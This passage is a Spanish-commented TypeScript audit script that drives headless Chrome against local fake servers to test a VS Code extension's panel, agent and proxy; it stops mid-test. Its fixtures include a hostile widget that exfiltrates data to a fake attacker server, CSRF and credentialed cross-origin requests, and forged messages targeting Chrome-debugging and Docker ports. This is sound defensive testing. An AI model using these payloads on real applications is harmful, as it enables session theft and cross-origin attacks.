// Auditoría, segunda pasada: el panel real (src/webview/panel.ts), el agente real (media/agent.js) y el proxy real,
// dentro de un Chrome sin ventana con perfil temporal. Lo único que se sustituye es VS Code: la página «panel» la sirve
// este guion con la misma CSP que panelHost.ts, acquireVsCodeApi es un doble, y el origen del panel se fija con
// px.setPanelOrigin(<origen de la página panel>), como hace panelHost.ts al recibir panelReady.
// Los eventos de ratón y teclado van por CDP (Input.*): son isTrusted, como los de una persona.
// Sin internet: el navegador arranca con la resolución de nombres anulada salvo localhost.
// Ejecutar desde la carpeta del prototipo:  node --no-warnings auditoria/r4-navegador.ts
import * as http from 'node:http';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { WebSocket } from 'ws';
import { build } from 'esbuild';
import { DEVICES, findDevice } from '../../src/core/devices.ts';
import { SYNC_ALL, type Cell } from '../../src/core/mosaic.ts';
import { GATE_PREFIX, PREFIX, startProxy, type RunningProxy } from '../../src/core/proxy.ts';
import { caso, espera, nota, resultado, servidorFalso } from './util.ts';
import type { PanelState, PanelText } from '../../src/webview/panel.ts';

const aqui = path.dirname(fileURLToPath(import.meta.url));
const raiz = path.dirname(path.dirname(aqui));
const CHROME = process.env.AUD_CHROME ?? 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
const agentSource = fs.readFileSync(path.join(raiz, 'media', 'agent.js'), 'utf8');
const built = await build({ entryPoints: [path.join(raiz, 'src', 'webview', 'panel.ts')], bundle: true, format: 'iife', target: 'es2020', write: false, logLevel: 'silent' });
const panelJs = built.outputFiles[0].text;

// ───────────────────────── servidor «malo» (otro origen: widget de terceros y destino de redirecciones)
const robado: string[] = [];
const aterrizajes: string[] = [];
const ATAQUE = `
  var o = new URLSearchParams(location.search).get('o') || location.ancestorOrigins[0];   // origen de la celda
  var oido = [], pasos = [];
  function informe() { fetch('/robado', { method: 'POST', body: JSON.stringify({ oido: oido, pasos: pasos }) }); }
  addEventListener('message', function (ev) { oido.push({ de: ev.origin, datos: ev.data }); });
  // 1) El ataque de la primera pasada: marco con nombre de celda y «sonda», y preguntas al agente.
  var f = document.createElement('iframe');
  f.name = 'vk:' + JSON.stringify({ sonda: true, fixCookies: true });
  f.src = o + '/perfil';
  f.onload = function () {
    pasos.push('marco con la app cargado (incrustar sigue siendo posible)');
    var w = f.contentWindow;
    [{ t: 'ask', id: 1, q: 'fetch', arg: { path: '/privado' } }, { t: 'ask', id: 2, q: 'estado', arg: {} }, { t: 'ask', id: 3, q: 'metrics' },
     { t: 'click', sel: 'body' }, { t: 'input', sel: '#secreto', kind: 'input', value: 'x' }, { t: 'nav', path: '/orden-nav-desde-fuera' }, { t: 'reload' }]
      .forEach(function (m) { m.vk = 1; w.postMessage(m, '*'); });
  };
  document.body.appendChild(f);
  // 2) Peticiones cruzadas con la sesión del usuario (las cookies van como SameSite=None).
  fetch(o + '/cruzada-fetch', { mode: 'no-cors', credentials: 'include' }).then(function () { pasos.push('fetch no-cors: resuelto (opaco)'); }, function () { pasos.push('fetch no-cors: rechazado'); });
  fetch(o + '/privado', { credentials: 'include' }).then(function (r) { return r.text(); }).then(function (t) { pasos.push('fetch cors LEIDO: ' + t); }, function () { pasos.push('fetch cors: bloqueado'); });
  var im = new Image(); im.onload = function () { pasos.push('img: cargada'); }; im.onerror = function () { pasos.push('img: error'); }; im.src = o + '/cruzada-img';
  var s = document.createElement('script'); s.onload = function () { pasos.push('agent.js como script: CARGADO'); }; s.onerror = function () { pasos.push('agent.js como script: bloqueado'); }; s.src = o + '/__viewkeeper/agent.js'; document.head.appendChild(s);
  var g = document.createElement('iframe'); g.name = 'destino'; document.body.appendChild(g);
  var fm = document.createElement('form'); fm.method = 'POST'; fm.action = o + '/cruzada-post'; fm.target = 'destino'; document.body.appendChild(fm); fm.submit();
  try { var ws = new WebSocket(o.replace('http', 'ws') + '/cruzada-ws'); ws.onopen = function () { pasos.push('websocket: ABIERTO'); }; ws.onerror = function () { pasos.push('websocket: rechazado'); }; } catch (e) { pasos.push('websocket: excepción'); }
  setTimeout(informe, 2500);
`;
const malo = await servidorFalso((req, res, body) => {
  const url = req.url ?? '/';
  if (url.startsWith('/robado')) {
    robado.push(body);
    return void res.writeHead(204).end();
  }
  if (url.startsWith('/aterrizaje')) {
    aterrizajes.push(url);
    return void res.writeHead(200, { 'content-type': 'text/html' }).end('<!doctype html><title>fuera</title>fuera');
  }
  if (url.startsWith('/widget')) return void res.writeHead(200, { 'content-type': 'text/html' }).end(`<!doctype html><html><head><title>widget</title></head><body><script>${ATAQUE}</script></body></html>`);
  res.writeHead(404).end();
});

// ───────────────────────── API en otro puerto: solo admite por CORS el origen de la app
const apiVistas: string[] = [];
let appOrigin = '';
const api = await servidorFalso((req, res, body) => {
  const url = req.url ?? '/';
  const origin = req.headers.origin;
  const cors: http.OutgoingHttpHeaders = origin === appOrigin ? { 'access-control-allow-origin': origin, 'access-control-allow-credentials': 'true', 'access-control-allow-headers': 'content-type', 'access-control-allow-methods': 'GET,POST' } : {};
  apiVistas.push(`${req.method} ${url} origin=${origin ?? '-'}`);
  if (req.method === 'OPTIONS') return void res.writeHead(204, cors).end();
  if (url === '/usuarios') return void res.writeHead(307, { ...cors, location: `http://${req.headers.host}/usuarios/` }).end();
  if (url.startsWith('/eco')) return void res.writeHead(200, { ...cors, 'content-type': 'application/json' }).end(JSON.stringify({ recibido: body }));
  res.writeHead(200, { ...cors, 'content-type': 'application/json' }).end(JSON.stringify({ api: 'ok', url }));
});

// ───────────────────────── app del usuario (servidor de pruebas)
const registro: { w: string; ev: string; host: string; top: string }[] = [];
const peticiones: string[] = [];
const secretos: string[] = [];
const tokenEnServidor: string[] = [];
const LOG = `<script>function log(ev){navigator.sendBeacon('/log?w='+innerWidth+'&top='+(top===self?1:0)+'&ev='+encodeURIComponent(ev));} addEventListener('DOMContentLoaded',function(){log('visible-para-la-pagina:'+document.referrer+'|'+performance.getEntriesByType('navigation')[0].name+'|'+document.cookie+'|'+name);log('cargada:'+location.pathname+':'+document.compatMode);});</script>`;
const campo = (id: string, y: number, extra: string): string => `<form id="${id}" style="position:absolute;left:10px;top:${y}px"><input id="q${id}" name="q" style="width:150px;height:24px">${extra}</form>`;
const PAGINA_FORM = `<!doctype html><html><head><meta charset="utf-8"><title>F</title><style>body{margin:0;font:14px system-ui}</style>${LOG}</head><body>
  ${campo('f', 10, '<button id="go" type="submit">Enviar</button>')}
  <button id="ico" style="position:absolute;left:10px;top:60px;width:60px;height:40px;padding:0"><svg width="50" height="30" viewBox="0 0 50 30"><rect width="50" height="30" fill="red"/></svg></button>
  <label id="lab" style="position:absolute;left:10px;top:120px;width:300px;height:30px;display:block"><span style="display:inline-block;width:220px;height:30px">Acepto las condiciones</span><input type="checkbox" id="chk"></label>
  ${campo('f2', 170, '<input name="otro" style="width:60px"><button type="button">Guardar (type=button)</button>')}
  ${campo('f3', 220, '<button type="submit" disabled>Enviar (deshabilitado)</button>')}
  ${campo('f4', 270, '')}
  <button type="submit" form="f4" style="position:absolute;left:230px;top:270px">Enviar (fuera, form=f4)</button>
  <script>
    var chk=document.getElementById('chk'),q=document.getElementById('qf');
    ['f','f2','f3','f4'].forEach(function(id){document.getElementById(id).addEventListener('submit',function(e){e.preventDefault();log('submit:'+id);});});
    document.getElementById('ico').addEventListener('click',function(){log('icono');});
    chk.addEventListener('change',function(){log('chk:'+chk.checked);});
    q.addEventListener('change',function(){log('change:'+q.value);});
    q.addEventListener('input',function(){log('input:'+q.value);});
  </script></body></html>`;
const PAGINA_SPA = `<!doctype html><html><head><meta charset="utf-8"><title>SPA</title><style>body{margin:0;font:14px system-ui}</style>${LOG}</head><body>
  <button id="sig" style="position:absolute;left:10px;top:10px;width:200px;height:40px">Siguiente</button>
  <div style="height:4000px"></div>
  <script>
    var n = 0;
    document.getElementById('sig').onclick = function () { n++; var k = n; setTimeout(function () { history.pushState({}, '', '/spa?p=' + k); log('push:' + k); }, 150); };
    var h = document.createElement('header'); h.style.cssText = 'position:absolute;left:10px;top:200px';
    (innerWidth < 500 ? ['Menu', 'Buscar'] : ['Cerrar sesion', 'Buscar']).forEach(function (t) {
      var b = document.createElement('button'); b.textContent = t; b.style.cssText = 'width:130px;height:30px'; b.onclick = function () { log('boton:' + t); }; h.appendChild(b);
    });
    document.body.appendChild(h);
    var tm; addEventListener('scroll', function () { clearTimeout(tm); tm = setTimeout(function () { log('ry:' + (scrollY / (document.documentElement.scrollHeight - innerHeight)).toFixed(3)); }, 400); });
  </script></body></html>`;
// Lo que una app hace consigo misma y no debe romperse: fetch, XHR, formulario POST con redirección, recarga, imagen.
const PAGINA_LEGIT = `<!doctype html><html><head><meta charset="utf-8"><title>legit</title>${LOG}</head><body><script>
  var fase = new URLSearchParams(location.search).get('fase') || '1';
  function st(p) { return p.then(function (r) { return r.status; }, function (e) { return 'ERROR ' + e.message; }); }
  if (fase === '1') {
    Promise.all([
      st(fetch('/eco', { method: 'POST', body: 'x' })), st(fetch('/dato')), st(fetch('/dato', { credentials: 'omit' })),
      new Promise(function (ok) { var x = new XMLHttpRequest(); x.open('POST', '/eco'); x.onloadend = function () { ok(x.status); }; x.send('y'); }),
      new Promise(function (ok) { var i = new Image(); i.onload = function () { ok('cargada'); }; i.onerror = function () { ok('error'); }; i.src = '/img.svg'; }),
      new Promise(function (ok) { addEventListener('message', function (ev) { if (ev.data && ev.data.caja) ok(ev.data.caja); });
        var f = document.createElement('iframe'); f.setAttribute('sandbox', 'allow-scripts');
        f.srcdoc = '<img src="' + location.origin + '/img.svg" onload="parent.postMessage({caja:\\'cargada\\'},\\'*\\')" onerror="parent.postMessage({caja:\\'error\\'},\\'*\\')">'; document.body.appendChild(f); setTimeout(function () { ok('sin respuesta'); }, 2000); }),
      new Promise(function (ok) { var l = document.createElement('link'); l.rel = 'manifest'; l.href = '/manifest.json'; document.head.appendChild(l); setTimeout(ok, 300); })
    ]).then(function (r) {
      log('legit:fetch POST=' + r[0] + ' fetch GET=' + r[1] + ' fetch sin credenciales=' + r[2] + ' XHR POST=' + r[3] + ' imagen=' + r[4] + ' imagen desde iframe sandbox de la propia app=' + r[5]);
      var fm = document.createElement('form'); fm.method = 'POST'; fm.action = '/post-redir'; document.body.appendChild(fm); fm.submit();
    });
  } else if (fase === '2') { log('legit:formulario POST con redirección 303 → llegó'); if (!sessionStorage.rec) { sessionStorage.rec = 1; location.href = '/legit?fase=3'; } }
  else if (fase === '3') { if (!sessionStorage.rec3) { sessionStorage.rec3 = 1; location.reload(); } else log('legit:location.reload() → llegó'); }
</script></body></html>`;
// Una sesión (invitado) intenta actuar sobre otra (admin) del mismo mosaico.
const PAGINA_ENTRE_SESIONES = `<!doctype html><html><head><meta charset="utf-8"><title>s</title>${LOG}</head><body><script>
  var o = new URLSearchParams(location.search).get('o');
  if (o) {
    fetch(o + '/sesion-fetch', { mode: 'no-cors', credentials: 'include' }).catch(function () {});
    new Image().src = o + '/sesion-img';
    var g = document.createElement('iframe'); g.name = 'd'; document.body.appendChild(g);
    var fm = document.createElement('form'); fm.method = 'POST'; fm.action = o + '/sesion-post'; fm.target = 'd'; document.body.appendChild(fm); fm.submit();
  }
</script></body></html>`;
const PAGINA_API = `<!doctype html><html><head><meta charset="utf-8"><title>api</title>${LOG}</head><body><script>
  var A = new URLSearchParams(location.search).get('api'), pref = top === self ? 'api-captura:' : 'api-celda:';
  function r(n, p) { return p.then(function (x) { return x.text().then(function (t) { return n + '=' + x.status + ' ' + t.slice(0, 60); }); }, function (e) { return n + '=ERROR ' + String(e.message || e).slice(0, 70); }); }
  function intento(n, fn) { try { return r(n, fn()); } catch (e) { return Promise.resolve(n + '=EXCEPCION ' + String(e.message || e).slice(0, 70)); } }
  Promise.all([
    intento('a fetch(cadena) GET', function () { return fetch(A + '/datos'); }),
    intento('b fetch(cadena) POST json', function () { return fetch(A + '/eco', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"k":1}' }); }),
    intento('c fetch(new Request) POST con cuerpo', function () { return fetch(new Request(A + '/eco', { method: 'POST', body: 'cuerpo-en-request' })); }),
    intento('d fetch(new Request) GET', function () { return fetch(new Request(A + '/datos')); }),
    intento('e fetch(new URL)', function () { return fetch(new URL(A + '/datos')); }),
    new Promise(function (ok) { var x = new XMLHttpRequest(); x.open('GET', A + '/datos'); x.onloadend = function () { ok('f XHR GET=' + x.status + ' ' + String(x.responseText).slice(0, 40)); }; x.send(); }),
    intento('g fetch con redirección 307 de la API', function () { return fetch(A + '/usuarios'); }),
    intento('h fetch relativo a la app', function () { return fetch('/dato'); }),
    intento('i fetch(Request POST) + init', function () { return fetch(new Request(A + '/eco', { method: 'POST', body: 'r' }), { headers: { 'x-a': '1' } }); })
  ]).then(function (out) { out.forEach(function (l) { log(pref + l); }); });
</script></body></html>`;
const PAGINA_IDIOMA = `<!doctype html><html><head><meta charset="utf-8"><title>i</title><style>body{margin:0}</style>${LOG}</head><body>
  <button id="b" style="position:absolute;left:10px;top:10px;width:200px;height:40px"></button>
  <input id="n" aria-label="" style="position:absolute;left:10px;top:70px;width:200px;height:24px">
  <script>var gl = navigator.language.indexOf('gl') === 0; var b = document.getElementById('b'), n = document.getElementById('n');
    b.textContent = gl ? 'Gardar cambios' : 'Guardar cambios'; n.setAttribute('aria-label', gl ? 'Nome' : 'Nombre');
    b.onclick = function () { log('idioma-clic:' + navigator.language); }; n.addEventListener('input', function () { log('idioma-escrito:' + n.value); });</script></body></html>`;
// Una página que fabrica mensajes del agente (cualquier script de la app puede hacerlo: es el mismo documento).
const PAGINA_FORJA = `<!doctype html><html><head><meta charset="utf-8"><title>forja</title>${LOG}</head><body><script>
  parent.postMessage({ vk: 1, t: 'hint', kind: 'api', origin: 'http://localhost:9222' }, '*');
  parent.postMessage({ vk: 1, t: 'hint', kind: 'api', origin: 'http://127.0.0.1:2375' }, '*');
  parent.postMessage({ vk: 1, t: 'answer', id: 1, data: { width: 'texto', pageHeight: 99999, secreto: document.title } }, '*');
</script></body></html>`;

function app(nombre: string): Promise<Awaited<ReturnType<typeof servidorFalso>>> {
  return servidorFalso((req, res, body) => {
    const u = new URL(req.url ?? '/', 'http://x');
    const ck = req.headers.cookie ?? '';
    const todo = (req.url ?? '') + JSON.stringify(req.headers);
    if (secretos.some((t) => todo.includes(t)) || todo.includes(GATE_PREFIX)) tokenEnServidor.push(`${nombre} ${req.url}`);
    const rol = /(?:^|; )rol=(\w+)/.exec(ck)?.[1] ?? '';
    const html = (b: string, headers: http.OutgoingHttpHeaders = {}): void => {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'x-frame-options': 'DENY', ...headers }).end(b);
    };
    const redir = (to: string, headers: http.OutgoingHttpHeaders = {}, status = 302): void => {
      res.writeHead(status, { location: to, ...headers }).end();
    };
    if (u.pathname === '/log') {
      registro.push({ w: u.searchParams.get('w') ?? '', ev: u.searchParams.get('ev') ?? '', host: nombre, top: u.searchParams.get('top') ?? '' });
      return void res.writeHead(204).end();
    }
    peticiones.push(`${nombre} ${req.method} ${u.pathname}${ck.includes('sid=') ? ' [con sid]' : ''}`);
    if (u.pathname === '/form') html(PAGINA_FORM);
    else if (u.pathname === '/spa') html(PAGINA_SPA);
    else if (u.pathname === '/legit') html(PAGINA_LEGIT);
    else if (u.pathname === '/entre') html(PAGINA_ENTRE_SESIONES);
    else if (u.pathname === '/apitest') html(PAGINA_API);
    else if (u.pathname === '/idioma') html(PAGINA_IDIOMA);
    else if (u.pathname === '/forja') html(PAGINA_FORJA);
    else if (u.pathname === '/eco') res.writeHead(200, { 'content-type': 'text/plain' }).end(body);
    else if (u.pathname === '/dato') res.writeHead(200, { 'content-type': 'application/json' }).end('{"dato":1}');
    else if (u.pathname === '/img.svg') res.writeHead(200, { 'content-type': 'image/svg+xml' }).end('<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>');
    else if (u.pathname === '/manifest.json') res.writeHead(200, { 'content-type': 'application/manifest+json' }).end('{"name":"x"}');
    else if (u.pathname === '/post-redir') redir('/legit?fase=2', {}, 303);
    else if (u.pathname === '/sinhead') html(`<!doctype html><title>sin head</title>${LOG}<p>documento HTML5 válido, sin etiqueta head</p>`);
    else if (u.pathname === '/conwidget') html(`<!doctype html><html><head><meta charset="utf-8"><title>App</title>${LOG}</head><body><h1>Mi app</h1><iframe src="${malo.origin}/widget" style="width:20px;height:20px;border:0"></iframe></body></html>`, { 'set-cookie': ['sid=SESION-DE-ANA; Path=/; HttpOnly; SameSite=Lax'] });
    else if (u.pathname === '/perfil') html(`<!doctype html><html><head><meta charset="utf-8"><title>Perfil</title></head><body>PERFIL PRIVADO ${ck.includes('sid=') ? 'de Ana (IBAN ES00 1234)' : '(sin sesión)'}<input id="secreto"></body></html>`);
    else if (u.pathname === '/privado') {
      if (!ck.includes('sid=SESION-DE-ANA')) res.writeHead(401, { 'content-type': 'application/json' }).end('{"error":"sin sesión"}');
      else res.writeHead(200, { 'content-type': 'application/json' }).end('{"saldo":"12.345 EUR","apiKey":"sk-de-desarrollo-123"}');
    } else if (u.pathname === '/soy') redir(u.searchParams.get('a') ?? '/inicio', { 'set-cookie': [`rol=${u.searchParams.get('rol') ?? ''}; Path=/`, 'sid=SESION-DE-ANA; Path=/; HttpOnly; SameSite=Lax'] });
    else if (u.pathname === '/inicio') html(`<!doctype html><html><head><meta charset="utf-8"><title>Inicio</title><style>body{margin:0}</style>${LOG}</head><body><a id="adm" href="/admin" style="position:absolute;left:10px;top:10px;display:block;width:200px;height:40px;background:#ddd">Administración</a></body></html>`);
    else if (u.pathname === '/admin' || u.pathname === '/panel') {
      if (rol === 'admin') html(`<!doctype html><html><head><title>${u.pathname}</title>${LOG}</head><body>zona ${u.pathname}</body></html>`);
      else redir('/login');
    } else if (u.pathname === '/login') {
      if (rol === 'admin') redir('/panel');
      else html(`<!doctype html><html><head><title>login</title>${LOG}</head><body>login</body></html>`);
    } else if (u.pathname === '/fuera') html(`<!doctype html><html><head><title>fuera</title>${LOG}</head><body><script>setTimeout(function(){location.href='${malo.origin}/aterrizaje-desde-celda';},200);</script></body></html>`);
    else res.writeHead(404, { 'content-type': 'text/plain' }).end('no existe');
  });
}
const up = await app('app1');
const up2 = await app('app2');
appOrigin = up.origin;
const px = await startProxy({ target: up.origin, agentSource, apiOrigins: [api.origin] });
const pxb = await startProxy({ target: up.origin, agentSource }); // segundo mosaico de la MISMA app
const px2 = await startProxy({ target: up2.origin, agentSource }); // mosaico de OTRA app
secretos.push(px.token, pxb.token, px2.token);

// ───────────────────────── página «panel»: mismo HTML y misma CSP que src/vscode/panelHost.ts
function estado(p: RunningProxy, cells: Cell[]): PanelState {
  return {
    name: 'banco',
    devices: DEVICES.map((d) => ({ id: d.id, name: d.name, width: d.width, height: d.height })),
    cells: cells.map((c) => {
      const d = findDevice(c.deviceId)!;
      return { ...c, label: d.name, width: d.width, height: d.height, entry: p.entryUrl(c.session, c.path), origin: p.originFor(c.session), cfg: { ua: d.userAgent, touch: d.mobile, lang: c.locale, fixCookies: true } };
    }),
    sync: SYNC_ALL,
    sonda: false, // modo producto
    // Los textos del panel salen de la extensión; aquí basta con que existan. El del cortacircuitos se busca en las pruebas.
    text: Object.fromEntries(['addDevice', 'sync', 'scroll', 'click', 'input', 'nav', 'reload', 'capture', 'save', 'session', 'matrix', 'rotate', 'remove', 'empty', 'session1'].map((k) => [k, k]).concat([['tripped', 'AVISO-CORTACIRCUITOS']])) as unknown as PanelText,
  };
}
const celda = (id: string, deviceId: string, p: string, session = 'main', group = 0, locale?: string): Cell => ({ id, deviceId, landscape: false, path: p, session, group, locale });
const tres = (p: string): Cell[] => [celda('a', 'iphone-15', p), celda('b', 'ipad-mini', p), celda('c', 'laptop', p)];
const escenas: Record<string, () => ReturnType<typeof estado>> = {
  form: () => estado(px, tres('/form')),
  spa: () => estado(px, tres('/spa')),
  quirks: () => estado(px, [celda('a', 'iphone-15', '/sinhead')]),
  widget: () => estado(px, [celda('a', 'iphone-15', '/conwidget')]),
  bucle: () => estado(px, [celda('a', 'iphone-15', '/soy?rol=admin', 'admin'), celda('b', 'iphone-15', '/soy?rol=inv', 'inv')]),
  fuera: () => estado(px, [celda('a', 'iphone-15', '/fuera')]),
  legit: () => estado(px, [celda('a', 'iphone-15', '/legit')]),
  entre: () => estado(px, [celda('a', 'iphone-15', '/soy?rol=admin&a=/dato', 'admin', 0), celda('b', 'iphone-15', `/entre?o=${encodeURIComponent(px.originFor('admin'))}`, 'inv', 1)]),
  api: () => estado(px, [celda('a', 'iphone-15', `/apitest?api=${encodeURIComponent(api.origin)}`)]),
  idioma: () => estado(px, [celda('a', 'iphone-15', '/idioma', 'main', 0, 'es'), celda('b', 'ipad-mini', '/idioma', 'main', 0, 'gl')]),
  forja: () => estado(px, [celda('a', 'iphone-15', '/forja')]),
  mismaApp: () => estado(pxb, [celda('a', 'iphone-15', '/form')]),
  otraApp: () => estado(px2, [celda('a', 'iphone-15', '/form')]),
};
const haciaHost: { e: string; m: Record<string, unknown> }[] = [];
const panel = await servidorFalso((req, res, body) => {
  const u = new URL(req.url ?? '/', 'http://x');
  if (u.pathname === '/panel.js') return void res.writeHead(200, { 'content-type': 'text/javascript' }).end(panelJs);
  if (u.pathname === '/host') {
    haciaHost.push({ e: u.searchParams.get('e') ?? '', m: JSON.parse(body) as Record<string, unknown> });
    return void res.writeHead(204).end();
  }
  const e = u.searchParams.get('e') ?? '';
  const st = escenas[e]?.();
  if (!st) return void res.writeHead(404).end();
  const origins = [...new Set(st.cells.map((c) => c.origin))];
  const nonce = 'auditoria';
  const csp = `default-src 'none'; frame-src ${origins.join(' ')}; script-src 'nonce-${nonce}'; style-src 'nonce-${nonce}'; connect-src 'self'`;
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }).end(`<!doctype html>
<html><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${csp}">
<style nonce="${nonce}">
  body { margin: 0; padding: 0; font: 12px system-ui; }
  #mosaico { padding: 12px; box-sizing: border-box; min-height: 100vh; }
  .fila { display: flex; flex-wrap: wrap; gap: 12px; align-items: flex-start; margin-bottom: 12px; }
  .aviso { flex-basis: 100%; margin: 0; padding: 6px 10px; }
  figure { margin: 0; flex: none; }
  figcaption { padding: 0 0 6px; white-space: nowrap; opacity: .85; }
  .escena { overflow: hidden; border: 1px solid #888; border-radius: 6px; background: #fff; }
  iframe { border: 0; transform-origin: 0 0; display: block; background: #fff; }
</style></head>
<body><div id="barra"></div><div id="mosaico"></div>
<script nonce="${nonce}">
  window.__alHost = []; window.__msgs = [];
  addEventListener('message', function (ev) { var m = ev.data; if (!m || m.vk !== 1) return; var fs = document.querySelectorAll('iframe'), i = -1; for (var k = 0; k < fs.length; k++) if (fs[k].contentWindow === ev.source) i = k; window.__msgs.push(i + ':' + m.t); });
  window.acquireVsCodeApi = function () {
    return { postMessage: function (m) {
      window.__alHost.push(m);
      fetch('/host?e=${e}', { method: 'POST', body: JSON.stringify(m) });
      if (m.t === 'panelReady') window.postMessage({ t: 'state', state: ${JSON.stringify(st)} }, location.origin);
    } };
  };
</script>
<script nonce="${nonce}" src="/panel.js"></script></body></html>`);
});
// Lo que hace panelHost.ts al recibir panelReady: el agente solo hablará con el origen del panel.
for (const p of [px, pxb, px2]) p.setPanelOrigin(panel.origin);

// ───────────────────────── Chrome sin ventana + CDP
// En un runner de CI recién arrancado Chrome puede tardar más de 10 s en abrir el puerto de depuración (pasó 3 veces
// el 19-11): hasta 30 s por intento y un segundo intento con perfil nuevo antes de rendirse.
function lanzaChrome(): { chrome: ReturnType<typeof spawn>; perfil: string } {
  const perfil = fs.mkdtempSync(path.join(process.env.AUD_TMP ?? os.tmpdir(), 'vk-aud-'));
  const chrome = spawn(
    CHROME,
    ['--headless=new', '--remote-debugging-port=0', `--user-data-dir=${perfil}`, '--no-first-run', '--no-default-browser-check', '--disable-extensions', '--disable-background-networking', '--disable-component-update', '--disable-sync', '--disable-default-apps', '--metrics-recording-only', '--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE localhost , EXCLUDE *.localhost , EXCLUDE 127.0.0.1', '--window-size=1600,1000', 'about:blank'],
    { stdio: 'ignore' },
  );
  return { chrome, perfil };
}
let { chrome, perfil } = lanzaChrome();
let wsUrl = '';
for (let intento = 1; intento <= 2 && !wsUrl; intento++) {
  if (intento === 2) {
    console.log('Chrome no abrió el puerto de depuración en 30 s; segundo intento con un perfil nuevo.');
    chrome.kill();
    ({ chrome, perfil } = lanzaChrome());
  }
  for (let i = 0; i < 300 && !wsUrl; i++) {
    await espera(100);
    try {
      const [p, ruta] = fs.readFileSync(path.join(perfil, 'DevToolsActivePort'), 'utf8').trim().split('\n');
      wsUrl = `ws://127.0.0.1:${p.trim()}${ruta.trim()}`;
    } catch {
      /* aún no */
    }
  }
}
if (!wsUrl) {
  console.log('No se pudo arrancar Chrome sin ventana; este guion no ha comprobado nada.');
  chrome.kill();
  process.exit(2);
}
const ws = new WebSocket(wsUrl, { perMessageDeflate: false });
await new Promise<void>((r, j) => {
  ws.once('open', () => r());
  ws.once('error', j);
});
let seq = 0;
const pend = new Map<number, (v: { result?: Record<string, unknown>; error?: { message: string } }) => void>();
ws.on('message', (d) => {
  const m = JSON.parse(String(d)) as { id?: number; result?: Record<string, unknown>; error?: { message: string } };
  if (m.id !== undefined) {
    pend.get(m.id)?.(m);
    pend.delete(m.id);
  }
});
function cdp(method: string, params: Record<string, unknown> = {}, sessionId?: string): Promise<Record<string, unknown>> {
  const id = ++seq;
  return new Promise((resolve, reject) => {
    pend.set(id, (m) => (m.error ? reject(new Error(`${method}: ${m.error.message}`)) : resolve(m.result ?? {})));
    ws.send(JSON.stringify({ id, method, params, sessionId }));
  });
}
async function pestana(url: string): Promise<string> {
  const { targetId } = (await cdp('Target.createTarget', { url: 'about:blank' })) as { targetId: string };
  const { sessionId } = (await cdp('Target.attachToTarget', { targetId, flatten: true })) as { sessionId: string };
  await cdp('Page.enable', {}, sessionId);
  await cdp('Emulation.setDeviceMetricsOverride', { width: 1600, height: 1000, deviceScaleFactor: 1, mobile: false }, sessionId);
  await cdp('Emulation.setFocusEmulationEnabled', { enabled: true }, sessionId);
  await espera(150);
  await cdp('Page.navigate', { url }, sessionId);
  return sessionId;
}
async function evalua<T>(s: string, expr: string): Promise<T> {
  const r = (await cdp('Runtime.evaluate', { expression: expr, returnByValue: true }, s)) as { result: { value: T } };
  return r.result.value;
}
async function clic(s: string, n: number, x: number, y: number): Promise<void> {
  const r = await evalua<{ l: number; t: number; w: number; cw: number }>(s, `(function(){var f=document.querySelectorAll('iframe')[${n}];var b=f.getBoundingClientRect();return {l:b.left,t:b.top,w:b.width,cw:f.clientWidth};})()`);
  const k = r.w / r.cw;
  const X = r.l + x * k;
  const Y = r.t + y * k;
  await cdp('Input.dispatchMouseEvent', { type: 'mouseMoved', x: X, y: Y }, s);
  await cdp('Input.dispatchMouseEvent', { type: 'mousePressed', x: X, y: Y, button: 'left', clickCount: 1 }, s);
  await cdp('Input.dispatchMouseEvent', { type: 'mouseReleased', x: X, y: Y, button: 'left', clickCount: 1 }, s);
}
async function teclea(s: string, texto: string): Promise<void> {
  for (const ch of texto) {
    await cdp('Input.dispatchKeyEvent', { type: 'keyDown', key: ch, text: ch }, s);
    await cdp('Input.dispatchKeyEvent', { type: 'keyUp', key: ch }, s);
    await espera(80);
  }
}
async function intro(s: string): Promise<void> {
  await cdp('Input.dispatchKeyEvent', { type: 'keyDown', key: 'Enter', code: 'Enter', windowsVirtualKeyCode: 13, nativeVirtualKeyCode: 13, text: '\r' }, s);
  await cdp('Input.dispatchKeyEvent', { type: 'keyUp', key: 'Enter', code: 'Enter', windowsVirtualKeyCode: 13, nativeVirtualKeyCode: 13 }, s);
}
async function hasta(cond: () => boolean, ms = 6000): Promise<boolean> {
  const t0 = Date.now();
  while (Date.now() - t0 < ms) {
    if (cond()) return true;
    await espera(100);
  }
  return cond();
}
const cuenta = (ev: string | RegExp, desde = 0): Record<string, string[]> => {
  const out: Record<string, string[]> = {};
  for (const r of registro.slice(desde)) if (typeof ev === 'string' ? r.ev === ev : ev.test(r.ev)) (out[r.w] ??= []).push(r.ev);
  return out;
};
const n = (o: Record<string, string[]>): string => JSON.stringify(Object.fromEntries(Object.entries(o).map(([k, v]) => [k, v.length])));
const cargadas = (ruta: string, desde: number, cuantas: number): Promise<boolean> => hasta(() => registro.slice(desde).filter((r) => r.ev.startsWith('cargada:' + ruta)).length >= cuantas);

try {
  // ══════════ Escena «form»
  {
    const s = await pestana(`${panel.origin}/?e=form`);
    const ok = await cargadas('/form', 0, 3);
    console.log(`\n[BASE] el mosaico carga en Chrome con el panel, el proxy y el agente corregidos: ${ok} ${n(cuenta(/^cargada/))}`);
    if (!ok) throw new Error('el mosaico no carga en este montaje: no se puede comprobar nada más');
    await espera(500);
    const msgs0 = await evalua<string[]>(s, 'window.__msgs.slice()');
    nota(`mensajes que el panel recibe de las celdas al cargar: ${JSON.stringify([...new Set(msgs0.map((x) => x.split(':')[1]))])}`);

    // Esperar a que llegue (o a que pasen 4 s) en vez de una pausa fija: en Windows de CI 700 ms no siempre bastan.
    let d = registro.length;
    await clic(s, 0, 35, 78);
    await hasta(() => {
      const c = cuenta('icono', d);
      return !!c['768'] && !!c['1366'];
    }, 4000);
    await espera(300);
    const ico = cuenta('icono', d);
    caso('CLI-1', '[H-5] clic sobre el icono SVG de un botón no llega a las otras celdas', !ico['768'] || !ico['1366'], `manejador ejecutado por celda: ${n(ico)}`);

    d = registro.length;
    await clic(s, 0, 60, 135);
    await hasta(() => {
      const c = cuenta(/^chk:/, d);
